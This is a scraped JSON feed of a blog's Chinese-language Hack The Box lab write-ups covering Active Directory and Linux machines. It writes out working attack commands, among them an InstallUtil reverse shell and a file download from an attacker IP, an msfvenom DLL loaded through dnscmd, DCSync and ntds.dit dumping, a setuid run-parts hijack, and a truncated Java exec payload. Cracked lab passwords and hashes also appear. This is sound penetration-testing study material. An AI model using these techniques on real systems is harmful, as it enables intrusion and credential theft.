[{"content":"扫端口\n域名：HTB.LOCAL\nsmb逐一枚举，没用扫到用户，但是能以guest的用户并且允许了空密码查看一些共享文件\n1 nxc smb 10.10.10.103 -u \u0026#39;guest\u0026#39; -p \u0026#39;\u0026#39; --shares 详细看看这俩个共享文件夹Department Shares IPC$\n1 smbclient //10.10.10.103/\u0026#34;Department Shares\u0026#34; -U \u0026#34;\u0026#34; IPC$文件里没有东西，Department Shares文件夹里有，但是这样一看看不出什么东西来\n看其他的大佬的wp后发现思路-寻找可写文件夹-发现有个user文件夹下会删除我们写的文件-\n这个删除的行为相当于一次交互-利用这一点执行SCF 文件攻击\nhttps://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/\n为了方便我们把smb共享目录挂载在本地上查看\nmount -t cifs \u0026lt;共享路径\u0026gt; \u0026lt;挂载点\u0026gt; -o \u0026lt;选项\u0026gt;\nmount -t cifs -o rw,username=guest,password= \u0026lsquo;//10.10.10.103/Department Shares\u0026rsquo; /mnt\n以读写模式挂载\n查看能写的文件夹，这里不能用find命令去看，因为我们这个文件夹是挂载的，所以最好的办法就是写一个脚本一个一个文件夹创建文件来看看能不能写文件\n1 2 3 4 5 6 7 8 9 10 #!/bin/bash list=$(find /mnt -type d) # 查找 /mnt 及其子目录，返回目录列表 for d in $list # 遍历每个目录 do touch $d/x 2\u0026gt;/dev/null # 尝试在该目录创建一个空文件 x，错误信息重定向到 /dev/null if [ $? -eq 0 ] # 检查 touch 命令是否成功 then echo $d \u0026#34; is writable\u0026#34; # 输出可写目录 fi done 我们能够在俩个文件夹下写\n在public文件夹中写入我们的scf攻击文件\n然后用responder开启smb服务并监听\n1 sudo responder -I tun0 等待一会\n成功拿到amanda用户的hash，爆破一下\nAshare1972，现在我们就有了一组账号密码了\n但是这个用户登陆不了\n这里要回到信息收集的时候，那个网站能爆出一个目录，我们可以用这个账号密码登陆\n进来后发现这里是一个可以搓证书的地方\nopenssl req -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr\n先搓一个amanda.csr出来，然后拿里面的码去生成我们需要的证书\n最后使用证书和key登陆\nevil-winrm -S -c certnew.cer -k amanda.key -i 10.10.10.103 -u 'amanda' -p 'Ashare1972'\n上去之后上传SharpHound.exe分析一下情况，但是上传报错，那就使用Houndblood-python去扫一下\n分析结果发现\nmrlky用户有很大的利用价值，不仅是因为他拥有对域的DCSync权限，还因为该账户被设置了SPN\n那么接下来，就进行Kerberoasting攻击\n但是尝试了几次都不行，那就换一个Kerberoasting攻击方法\n了解到我们可以使用Rubeus请求\n但是我们目前无法上传文件，原因是现在是约束模式（Constrained Language Mode）\n$ExecutionContext.SessionState.LanguageMode\n因此现在我们该突破这个约束\n选择利用PSByPassCLM\niwr -uri http://10.10.16.21:5001/PsBypassCLM.exe -outfile PsBypassCLM.exe\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.16.21 /rport=2333 C:\\Users\\amanda\\Documents\\PsBypassCLM.exe\n现在我们就拥有了一个不被限制的shell了\n现在将Rubeus文件上传,执行\n.\\rubeus.exe kerberoast /creduser:htb.local*amanda* /credpassword:Ashare1972\n又有问题了，rubeus文件被系统ban了\nAppLocker 或 Windows Defender Application Control（WDAC） 阻止了 Rubeus。 被 Windows Defender 或其他安全工具检测为恶意软件（基于特征码或路径）。 现在该想如何绕过这个限制\n经了解，可以将文件放置在这些文件夹的话，就可以执行\nhttps://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md\n经测试，可以在\nC:\\Windows\\System32\\spool\\drivers\\color目录下绕过策略组执行\n成功拿到mrlky用户的hash，上爆破！！\n结果一直爆破不出来。。后来重新运行了一下结果能爆破出来了？而且俩次的hash值也不同\n所以，这是为啥呢。。。\n不管怎么说，我们现在有了mrlky的账户\nFootball#7\n是时候向着最后一步发起冲击了！\n虽然evil登不了（应该是像amanda一样需要搓证书），但是我们已经拥有了mrlky账户密码，直接secretsdump倾倒出hash密码\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267\n同样的administratot估计也登不了evil-winrm，但是我们还有其他交互shell\n成功拿到shell\n再交完用户和系统标志后来理一下这个靶机的流程\n扫到匿名smb共享目录，发写可写的俩个文件夹，同时存在交互（删除文件）满足SCF文件攻击的特性\u0026ndash;\u0026gt;拿到初始用户\u0026ndash;\u0026gt;发现用户密码能够用在搓证书的网页搓证书得以登陆evil-winrm\u0026ndash;\u0026gt;bloodhound-python得知mrlky用户有SPN标志，满足Kerberoasting攻击\u0026ndash;\u0026gt;impacket攻击不作用使用Rubeus攻击，但是发现power shell受限\u0026ndash;\u0026gt;利用PSByPassCLM突破限制\u0026ndash;\u0026gt;后又存在AppLocker限制将文件放在特殊的文件夹下得以破解\u0026ndash;\u0026gt;使用rubeus.exe拿到mrlky的hash\u0026ndash;\u0026gt;拿到账户密码发动DCSync攻击\n","date":"2025-03-31T20:24:47+08:00","image":"https://nergigantes.github.io/19.jpg","permalink":"https://nergigantes.github.io/htb/sizzle/","title":"Sizzle"},{"content":"速通教程： 使用netexec扫一下漏洞\n1 nxc smb \u0026lt;ip\u0026gt; -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; -M zerologon 发现该靶机适用\n直接下载poc利用\n成功了。。\n以学习目的来，还是一步一步来看看其他的方法 浅浅的扫一个端口\n域名：megabank.local\n能够以匿名用户登陆rpc\nrpcclient -U \u0026quot;\u0026quot; -N 10.10.10.169\n并且能够执行enumdomusers命令列举用户\n使用netexec枚举一下通过smb活动的用户\n发现了一个有趣的东西\nmarko 2019-09-27 13:17:14 0 Account created. Password set to Welcome123!\n尝试使用这个密码登陆，失败，那就用这个密码进行喷洒\n先把这些用户存起来\n1 nxc smb 10.10.10.169 -u 1.txt -p Welcome123! 可以看到melanie用户对映这个密码\n之后看看bloodhound\n目前这个用户没有什么可以进行利用的东西\n上传winpeas看看还有什么东西遗漏了\n很奇怪，这个靶机的winpeas用不了。。\n最后能够找到一个隐藏的文件\ntype PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt\n里面存放了ryan的密码\nServ3r4Admin4cc123!\n在bloodhound里查看ryan\n能够看到这个账号是DNSADMIN用户里的，这样就可以进行提权了\n1 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.16.21 LPORT=9001 -f dll \u0026gt; ff.dll 生成木马dll,利用impacket-smbserver开启smb服务远程挂载木马dll(上传本地会被吞)\n记得修改木马文件权限不然会失败\nchmod 777 ff.dll\n1 impacket-smbserver s ./ 之后执行\ncmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.16.21\\s\\ff.dll\nsc.exe stop dns\nsc.exe start dns\n","date":"2025-03-29T13:36:57+08:00","image":"https://nergigantes.github.io/10.jpg","permalink":"https://nergigantes.github.io/htb/resolute/","title":"Resolute"},{"content":"扫一下端口\n没看到具体的域名，用crackmapexec看一下\nBLACKFIELD.local 域名知道了，之后根据开放的端口看一下，kerbrute,rpcclient都没有有用的信息，smb发现了一个共享的文件\n进去看一下\nsmbclient -N //10.10.10.192/profiles$（$用这个是因为是隐藏文件）\n这应该是一个用户名的列表，进行AS-REP Roasting攻击\n拿到了一个support用户的hash，爆破一下\n之前看到了5985是开放的,evil-winrm登一下\nevil-winrm -i 10.10.10.192 -u support -p #00^BlackKnight\n登不了，smbexec也是一样，没有shell\n那就用bloodhound-python去分析一下\n1 bloodhound-python -c ALL -u support -p \u0026#39;#00^BlackKnight\u0026#39; -d blackfield.local -dc dc01.blackfield.local -ns 10.10.10.192 support用户没有什么权限可利用的，除了能对一个\nAUDIT2020的用户有强制更改密码的权限，让我们看看这个权限怎么用\nhttps://room362.com/posts/2017/reset-ad-user-password-with-linux/\n这篇文章写了如何重置密码，来让我们滥用这个权限\n使用rpcclient登陆support账户\nrpcclient -U \u0026lsquo;support\u0026rsquo; 10.10.10.192 setuserinfo2 AUDIT2020 23 \u0026lsquo;12345678\u0026rsquo; 现在来验证一下，失败了，，？\n更换一下密码 123456789a!\n成功\n进去后能翻一个新的文件夹，找到了一个管理员的密码?\n很遗憾这是fake。。\n后面了解的一个重要的压缩包，lsass.zip\n用pypykatz lsa minidump lsass.dmp分析了一堆账户密码，最有价值的是这个账户\n有了hash而且有CanPSRmote可以用evil登陆尝试一下了9658d1d1dcd9250115e2205d9f48400d\n嗯，进来了\n之后whoami /priv查看特权\n特殊点在这，SeBackupPrivilege\n我们拥有这个权限\nSeBackupPrivilege 特权允许用户对系统中的大部分文件进行备份，哪怕文件的访问控制列表（ACL）并未赋予该用户这种访问权限。因此，攻击者可以通过 SeBackupPrivilege 特权备份整个系统盘，从而直接从创建的备份卷中访问任何文件。\n根据**SeBackupPrivilege利用流程走**\n1.建立 shadowscript.txt 文件\n1 2 3 4 set context persistent nowriters# add volume c: alias binsec# create# expose %binsec% z:# 之后将该文件上传到 C:.enum 目录下（自行建立）\n2修改使用者权限 利用 ACL-object让账号用有\u0026lt;font style=\u0026quot;color:rgb(51, 51, 51);\u0026quot;\u0026gt;C:\\Windows\\NTDS\\ntds.dit\u0026lt;/font\u0026gt;的存取權权\n1 2 3 4 5 $NTDS = \u0026#34;C:\\Windows\\NTDS\\ntds.dit\u0026#34; $acl = Get-Acl $NTDS $AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule(\u0026#34;blackfield.local\\svc_backup\u0026#34;,\u0026#34;FullControl\u0026#34;,\u0026#34;Allow\u0026#34;) $acl.SetAccessRule($AccessRule) $acl | Set-Acl $NTDS 使用完后检查\n3执行diskshadow.exe\ndiskshadow.exe /s C:.enum\\shadowscript.txt\n只后抓取俩个重要文件\n1 2 reg save HKLM\\SYSTEM SYSTEM.SAV reg save HKLM\\SAM SAM.SAV（域不需要） 现在当前目录下就有了\n再copy一下ntds.dit\nrobocopy /b Z:\\Windows\\NTDS C:\\Users\\Public ntds.dit\n之后传回爆破\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::\n","date":"2025-03-29T13:36:53+08:00","image":"https://nergigantes.github.io/19.jpg","permalink":"https://nergigantes.github.io/htb/blackfield/","title":"Blackfield"},{"content":"扫端口\n发现了一个奇奇怪怪的域名(Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)很奇怪的格式我们先确认一下域名\ncrackmapexec smb 10.10.10.175\n不知道为什么报错了但是还是出了结果\n再看看其他端口\n有kerbreos,rpc\nrpcclient没权限\nkerbrute出了4个用户名\n试一下能不能拿到hash\n拿到了fsmith用户的hash，爆破登陆\nThestrokes23\n登陆后传bloodhound看域情况，还有winPEAS看看提权情况\n当前用户的权限很低，寻找其他用户看看\nwinPEAS扫出了一组账户密码\nSome AutoLogon credentials were found\nDefaultDomainName : EGOTISTICALBANK DefaultUserName : EGOTISTICALBANK\\svc_loanmanager DefaultPassword : Moneymakestheworldgoround! 但是这个账户登不了。。。并且我们的bloohhound也搜不到这个用户\n陷入了瓶颈看了其他大佬的wp，原来是\n里面有个svc-loanmgr用户，用这个密码登（原因是长得像？？？）\n我们先在bloodhound查看一下这个用户有没有啥权限\n这个用户拥有对域DCSync权限,所以现在的思路是登陆这个账户然后进行DCSync攻击拿到管理员的hash,然后接管这个域\n成功拿到了管理员的hash，用这个hash登陆一下\n成功了！\n","date":"2025-03-22T19:05:53+08:00","image":"https://nergigantes.github.io/3.jpg","permalink":"https://nergigantes.github.io/htb/sauna/","title":"Sauna"},{"content":"端口信息：\n发现了域名active.htb\nsmbmap扫到了无需用户就可以拥有读的权限\n使用smbclient\nsmbclient -N \\\\10.10.10.100\\Replication\nrecurse列出一下文件\n最后找到了一个文件\n里面包含了一个账户密码\n这个密码不是hash值。\n用gpp-decrypt\nGPPstillStandingStrong2k18\n拿到了账户密码尝试evil登陆，但是不行。原因很简单前面的nmap就扫到了5985端口没开。\n尝试用smbexec登陆这个账户,也是不行，用smbclient看一下文件\n可以用smbmap使用这个账户\n之后使用Kerberoasting攻击拿管理员的密码hash，如果是弱hash能爆出来\n这里报了错，具体原因是我们攻击机和服务器的时差不能超过5分钟，但是我和和靶机的市区不是同一个。。。\n于是就拿了官方wp爆出来的hash\nimpacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request\n1 2 3 4 5 6 7 8 9 10 11 $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9 184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a 994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0b ea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa 7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d 937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7 532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952 d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b 94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550de cb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2c ec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174 hashcat直接爆\nTicketmaster1968\n尝试使用smbexec登陆，成功\n","date":"2025-03-22T19:05:52+08:00","image":"https://nergigantes.github.io/1.jpg","permalink":"https://nergigantes.github.io/htb/active/","title":"Active"},{"content":"扫端口\nnmap -sCV -A 10.10.10.161\n第一次做域渗透的靶机，详细的看看\n1 2 3 4 5 ● Kerberos （88/TCP）— Windows Kerberos 协议服务，可用于枚举AD 信息 ● LDAP （389/TCP）— 活动目录 LDAP。LDAP 通常提供有关 AD 的详细信息。而如果允许匿名绑定，我们可以查询到很多好的AD信息，比如用户信息。 ● SMB （445/TCP）— Windows 服务器消息块 （“SMB”） 协议。对于 SMB，最好检查它是否允许空会话。如果允许我们可以枚举许多有用的 AD 信息。 ● WinRM （5985/TCP）— WS-Management 协议的 Microsoft 实现。这可以允许通过 PowerShell 进行远程连接。 ● RPC（135/RPC） 可用于枚举AD 信息 smb2-security-mode：这是 Nmap 用来检查 SMBv2 安全设置的结果。\nMessage signing enabled and required：这表示消息签名已启用并且是强制性的。在 SMB 协议中，启用消息签名有助于防止中间人攻击，保证数据的完整性和真实性。强制要求消息签名表示任何连接到该服务的客户端都必须使用消息签名。\naccount_used: ：没有提供账户信息，通常这表示你没有成功登录任何账户，可能是匿名访问或者没有认证。 authentication_level: user：这表示 SMB 服务要求使用用户级别的认证。也就是说，在连接时需要提供用户名和密码来验证用户身份。 challenge_response: supported：支持挑战-响应认证，这通常是指 NTLM（NT LAN Manager）认证机制，用于验证用户身份。 message_signing: required：消息签名是必需的，确保 SMB 通信的安全性和完整性。 OS: Windows Server 2016 Standard 14393：这是目标系统的操作系统版本。它运行的是 Windows Server 2016 Standard，版本号为 14393。 Computer name: FOREST：计算机的主机名是 FOREST。 NetBIOS computer name: FOREST\\x00：NetBIOS 名称也是 FOREST，\\x00 是 NetBIOS 名称的结束符。 Domain name: htb.local：该机器加入了名为 htb.local 的域。 Forest name: htb.local：这是 Active Directory 林（Forest）的名称，与域名相同。 FQDN: FOREST.htb.local：这是完整的域名（FQDN），即 FOREST.htb.local date：表示系统当前时间是 2025-03-20T02:27:24（UTC）。 start_date：表示 SMB 服务启动的时间为 2025-03-20T02:22:58（UTC）。 clock-skew：系统时间偏差。这里显示的偏差值如下： mean (平均偏差): 2小时08分钟29秒 deviation (偏差范围): 4小时02分钟30秒 median (中位数): -11分钟31秒 枚举一下用户名，用kerbrute爆一下\n1 ./kerbrute_linux_amd64 userenum --dc 10.10.10.161 -d htb.local /home/kali/Desktop/Blasting-Dictionary-master/xato-net-10-million-usernames.txt 取决于字典\n还有就是rpcclient\nrpcclient是Samba套件中的一个工具，允许攻击者或渗透测试人员与Windows系统上的SMB服务进行交互，执行各种RPC调用。它可用于枚举域信息、用户、组、共享资源等\n前面的信息收集看到了开放了的135RPC端口\n1 2 3 4 5 6 #RPC测试 rpcclient -U \u0026#34;\u0026#34; 10.10.10.161 建立连接 enumdomusers 枚举用户 srvinfo 服务器信息枚举 enumdomains 枚举网络中的所有域 ips：空身份验证有助于在使用时枚举域和用户，这是 Windows Server 2003 和 2008 中的一项功能。在以后的版本中，它在进行全新安装时被删除。从以前版本的 Windows Server 升级时，该功能不会被禁用，因为用户可能正在使用此功能。 所有当前就列举出来了以下用户\nmark\nandy\nforest\nadministrator\nsebastien\nsanti\nlucinda\nsvc-alfresco\n然后使用impacket-GetNPUsers爆破一下这些用户的hash值\n成功的拿到了svc-alfresco用户的hash\n爆破一下\n成功的拿到了密码\ns3rvice\n然后使用 evil-winRM 登陆一下\n登陆成功了上传bloodhound.exe看一下域的情况\n拿回zip文件放回本地分析一下\n为当前的SVC-ALFRESCO用户加骷髅头之后查看最短线\n我们当前用户组一环套一环，最终能看到我们是ACCOUNT OPERATORS组的一员并且能够拥有EXCH01.HTB.LOCAL的完全权限\n现在看着有点迷，但是我们再看看EXCH01.HTB.LOCAL的线就清楚了\n所有现在思路是创建一个新的用户，给他加到EXCHANGE WINDOWS PERMISSIONS组，使得他在HTB.LOCAL有WriteDacl的权限，然后给这个用户DcSync 权限，接着执行 DcSync 攻击并转储域上所有用户的密码哈希值，之后通过管理员的hash登陆，接管域\n1 2 3 4 1. net user zss password /add /domain 2. net group \u0026#34;EXCHANGE WINDOWS PERMISSIONS\u0026#34; /add zss 3. 上传Powerview.ps1文件给到zss用户DcSync 权限 Import-Module .\\PowerView.ps1 **$pass = convertto-securestring \u0026lsquo;password\u0026rsquo; -AsPlainText -Force\n****$cred = New-Object System.Management.Automation.PSCredential(\u0026lsquo;htb\\zeus\u0026rsquo;, $pass)\n**Add-DomainObjectAcl -Credential $cred -TargetIdentity \u0026ldquo;DC=htb,DC=local\u0026rdquo; -PrincipalIdentity zss -Rights DCSync\n然后用secretsdump脚本拿到hash\n再用psexec脚本使用hash值登陆\nimpacket-psexec htb.local/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6\n成功了！！！\n","date":"2025-03-22T19:00:49+08:00","image":"https://nergigantes.github.io/27.jpg","permalink":"https://nergigantes.github.io/htb/forest/","title":"Forest"},{"content":"外网打点 三板斧\n扫端口，目录，域名\n异常的10010端口没有发现，也没有扫到域名，浅浅的扫到了登录注册界面\n注册了进去看一下cookie，典型的jwt开头\n但是这次和我以前不同的是有个kid的连接，指向了一个服务器本地的私钥文件\n刚开始很懵因为和以前的不一样，（爆破之类）后来反应过来那个服务器本地的私钥是我们可以篡改的，直接把那个连接指向我们的key\n然后修改admin的认证数字\n成功！！\n权限提升 进入系统后可以在/var/backups看到noha用户的ssh私钥，并且权限是可读的\nmkdir /tmp/.tempdir \u0026amp;\u0026amp; tar -C /tmp/.tempdir -xzf /var/backups/home.tar.gz\n然后直接在我们有写入权限的文件夹下解压这个备份拿到id_rsa登陆\n登陆后查看当前用户超级权限文件\n看到的是可以运行docker\n先docker -v看看版本\nDocker version 18.06.0-ce, build 0ffa825\n网上搜Poc存在CVE-2019-5736\n拿poc直接打\n首先我的想法是直接在docker时给到/bin/bash u+s的权限这样以来可以让我直接运行/bin/bash时就能成为root用户（但是没用。。不知道为什么不能这样做）\nhttps://medium.com/@ali.tamer.ibrahim/thenotebook-d6bcb940d139\n看了大佬的思路。。将当前我们所有的noah的用户的sudo权限扩展的全局\n这个起作用了（0.0）ps:我的为啥不行\n只会还要注意到一点，这个poc需要运行poc的时候同时运行docker\n原因具体是这样的\n成功啦。。\n","date":"2025-03-19T21:27:22+08:00","image":"https://nergigantes.github.io/21.jpg","permalink":"https://nergigantes.github.io/htb/thenotebookdocker-%E9%80%83%E9%80%B8/","title":"TheNotebook(Docker 逃逸)"},{"content":"寻找立足点 扫描端口22,80,8080,有子域名子域名扫描无发现，目录爆破无发现\n在一个页面的url看着像文件包含\n测试了一会确实能读到相对路径成功的文件\n然后看8080的网页\n这里告诉我们说有一个后台网页但需要账号密码，并且他还告诉了我们储存账号密码的文件/etc/tomcat9/tomcat-users.xml位置\n但这个位置不对，查资料找到正确位置\n登录\n进入到后台页面虽然有一个还是不能登，但是了解到我们可以从另一个页面上传一个war文件\n使用msfvenom制作一个reshell文件并配合curl上传\n拿到shell\n权限提升 在拿到shell的目录下没有发现什么东西，查找conf.db文件也没有结果\n去看看另一个网页下有没有什么东西\n/var/www/html\n在files目录下有个zip文件\n解压要密码，下到本地的kali去爆破\njohn爆破到密码为admin@it\n然后解压结果是一套网页的代码，没有其他东西\n猜测这个密码也是一个用户的密码，试一下ash\n成功\n提权到root过程中了解到我们的用户位于lxd权限组，但是我根据流程走的时候失败了\n","date":"2025-03-19T16:38:29+08:00","image":"https://nergigantes.github.io/26.jpg","permalink":"https://nergigantes.github.io/htb/tabby/","title":"Tabby"},{"content":"寻找立足点 扫描端口，22和80打开网页提示我们说这个网站已经被写入了后门，在互联网上搜索留下的痕迹Xh4H\n发现后门地址smevk.php，账号密码为admin:admin\n进入cms上传phpshell拿到立足点\n权限提升 .ssh文件储存在用户目录下，并且有权限\nwebadmin可以使用一个lua编程语言提升到sysadmin用户\n之后该系统再每个用户ssh登录时会访问00\u0026gt;header文件，将该文件植入提权木马\n先创建一个自己的ssh，然后将公共钥匙改名为认证钥匙替换原本的认证钥匙，在使用创建的ssh文件登录，然后触发我们在00\u0026gt;header里植入的代码拿到root\n","date":"2025-03-19T16:38:29+08:00","image":"https://nergigantes.github.io/3.jpg","permalink":"https://nergigantes.github.io/htb/traceback/","title":"TraceBack"},{"content":"寻找立足点 namp扫描端口，得知80端口的服务器为Nostromo 1.9.6\n搜索发现有poc\n使用msfconsole框架拿到shell\n权限提升 从www-data-\u0026gt;david 根据机器信息查找配置文件\nfind -name conf\n进入有权限的这个文件夹\n查看配置文件\n里面有个.htpasswd文件，是错误的\n关注public_www这个文件夹\n在/home里，进入david用户目录下访问\n发现有david的ssh文件的备份\n用nc连接把这个文件下下来\n1 2 kali：nc -lvnp 9933 \u0026gt; backup.tgz 靶机：nc 10.10.14.2 9933 \u0026lt; /home/david/public/protected-file-area/backup-ssh-identity-files.tgz 这三个文件尝试用id_rsa登录david用户，发现有密码\n我们进行破解\n首先把id_rsa 使用SSH2John 将其转换为哈希值\n然后使用john破解得到密码hunter\n用这个用户登录ssh成功\n从david-\u0026gt;root 用该命令去找可写目录\nfind / -writable -type d 2\u0026gt;/dev/null\n没啥发现，在david查看目录\n发现有个\n明确看到/usr/bin/journalctl能以root执行\n/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service去除后面的管道符提权\n","date":"2025-03-19T16:38:29+08:00","image":"https://nergigantes.github.io/1.jpg","permalink":"https://nergigantes.github.io/htb/traverxec/","title":"Traverxec"},{"content":"寻找立足点 扫描端口，22,80打开网页，注册个账号，在重置密码处存在sql注入\nbp抓包用sqlmap跑\n1 sqlmap -r sql.txt -p email –level 5 –risk 3 –threads 10 –batch –dbs 爆库名\n1 sqlmap -r sql.txt -p email –level 5 –risk 3 –threads 10 –batch -D usage_blog –tables 爆表名\n1 sqlmap -r sql.txt -p email –level 5 –risk 3 –threads 10 –batch -D usage_blog -T admin_users –dump 爆列名数据\n得到数据拿去john解码得到whatever1\n登录cms\n得知当前cms版本存在文件上传漏洞，编辑admin身份的图像，本地改为.jpg类型，通过前端验证后抓包改为php执行shell命令\n权限提升 dash-\u0026gt;xander dash用户执行不了sudo命令，后面发现在用户主目录有一个.monitrc的文件里面有xander用户的密码\nsu 提升\nxander-\u0026gt;root sudo -l查看有一个root文件可用，/usr/bin/usage_management，\nstring /usr/bin/usage_management查看详细信息\n搜索得知这个文件可以在/var/www/html文件里，通过自行创建一个文件test,然后用\n1 ln -s /目标文件 test 进行管道连接，将test文件连接到目标文件\n将test文件与root用户的ssh密钥进行连接\n然后执行/usr/bin/usage_management文件，在执行过程中我们想要的文件会泄露出来\n这样就得到了root用户的ssh密钥\nssh -i rsa root@ip进行登录\n","date":"2025-03-19T16:38:29+08:00","image":"https://nergigantes.github.io/26.jpg","permalink":"https://nergigantes.github.io/htb/usage/","title":"Usage"},{"content":"寻找立足点 扫描端口22,80,443\n网页打开只有一张图片，目录扫描有个dev目录里面有个hype_key文件，16进制换字符串看到是个rsa私钥，john破解不了\n这时再用namp扫描漏洞查看受到Heartbleed Bug\nmsfconle上有漏洞使用\n将参数 “verbose” 设置为 True\n这样直接在控制台看到一串base64\n转码为heartbleedbelievethehype\n猜测为私钥密码登录但提升说版本不对\n问ai说添加参数\nssh -i rsa_hype -o PubkeyAcceptedAlgorithms=+ssh-rsa hype@10.10.10.79\n成功登录\n权限提升 使用linpeas扫到存在CVE-2016-5195脏牛漏洞，直接上传脚本得到root权限\n","date":"2025-03-19T16:38:29+08:00","image":"https://nergigantes.github.io/20.jpg","permalink":"https://nergigantes.github.io/htb/valentine/","title":"Valentine"},{"content":"外网打点 三件套安排\n扫端口，扫目录，扫子域名（有域名的话）\n直接扫的话开始没有东西，百思不得其解看wp说要注意给的信息\n要加上sparklays的子目录\n后面扫到一个文件上传，经测试可以上传php5文件\n上马拿到shell\n提权 上传linpeas扫\n发现pwnkit提示上传马拿到root\n但是找不到标志\n是在内网的靶机上\nfscan扫到俩个存活的\n192.168.122.4和192.168.122.5\n先用frps搭建隧道\n看192.168.122.4\n打开后是一个VPN配置信息，并允许我们测试我们的VPN\nhttps://link.zhihu.com/?target=https%3A//medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da\n如何用ovpn配置文件反弹shell的教程\n跟着走拿到shell可以看到user.txt里，猜测root.txt在另一个内网靶机里\n但是不知道怎么做。。。。\n","date":"2025-03-19T16:38:29+08:00","image":"https://nergigantes.github.io/6.jpg","permalink":"https://nergigantes.github.io/htb/vault%E5%86%85%E7%BD%91%E6%9C%AA%E5%AE%8C/","title":"Vault（内网未完）"},{"content":"端口，域名，无发现\n该网站有防Dos功能，目录爆破用不了\nrobots.txt提示了有个writeup\n打开这个页面底部下提示了由\nCMS Simple Made制造\n该版本存在CVE-2019-9053\n能拿到管理员密码\nssh登录\n权限提升 该用户的用户组存在一个\n并且通过查看进程我们能看到\n当有ssh登录时，会以run-parts执行 run-parts 命令通常用来执行指定目录下的所有脚本文件。在此例中，它会运行 /etc/update-motd.d\n而我们可以写/usr/local\n因此可以将run-parts更改为我们的提权bash\necho -e \u0026lsquo;#!/bin/bash\\n\\nchmod u+s /bin/bash\u0026rsquo; \u0026gt; /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts\n然后通过ssh登录，机器就会以root权限运行我们的run-parts文件\n拿到我们的root\n","date":"2025-03-19T16:38:29+08:00","image":"https://nergigantes.github.io/22.jpg","permalink":"https://nergigantes.github.io/htb/writeup/","title":"Writeup"},{"content":"寻找立足点 打开网页能看到一个登录接口\n试一下万能密码admin\u0026rsquo; or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\n进去了然后是一个上传接口\n有只限图片后缀的白名单\n这样能绕过\n拿到shell\n权限提升 找到数据库的账号密码\n但是mysql不能连接\n用mysqldump \u0026ndash;user=theseus \u0026ndash;password=iamkingtheseus \u0026ndash;host=localhost Magic\n将数据都导出\n拿到thesesu的密码\n切换为thesesu用户\n然后查找二进制文件\n/bin/sysinfo是我们这个用户组的\n读取这个文件得知这个文件调用了popen去打开一个fidsk系统文件\n没有用绝对路径所以存在路径劫持\n","date":"2025-03-19T16:38:28+08:00","image":"https://nergigantes.github.io/1.jpg","permalink":"https://nergigantes.github.io/htb/magic/","title":"Magic"},{"content":"Java.type(\u0026lsquo;java.lang.Runtime\u0026rsquo;).getRuntime().exec(\u0026lsquo;cp /bin/sh /tmp/sh\u0026rsquo;).waitFor()\nJava.type(\u0026lsquo;java.lang.Runtime\u0026rsquo;).getRuntime().exec(\u0026lsquo;chmod u+s 